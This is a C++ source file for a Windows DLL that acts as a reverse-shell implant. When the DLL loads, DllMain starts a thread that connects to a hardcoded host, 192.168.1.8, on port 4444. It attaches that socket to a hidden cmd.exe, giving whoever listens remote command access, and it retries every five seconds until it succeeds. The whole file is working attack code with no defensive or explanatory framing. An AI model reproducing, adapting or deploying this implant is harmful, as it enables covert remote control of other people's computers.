#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")


DWORD WINAPI ReverseShell(LPVOID lpParam){
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsaData);

    while (true){
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (sock == INVALID_SOCKET){
            Sleep(5000);
            continue;
        }

        ZeroMemory(&server, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr("192.168.1.8");
        server.sin_port = htons(4444);

        if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR){
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        if (CreateProcessA(
            NULL,
            const_cast<LPSTR>("cmd.exe"),
            NULL, NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL, NULL,
            &si, &pi
        )) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        closesocket(sock);
        Sleep(5000);
    }
    WSACleanup();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID){
    if (reason == DLL_PROCESS_ATTACH){
        CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    }
    return TRUE;
}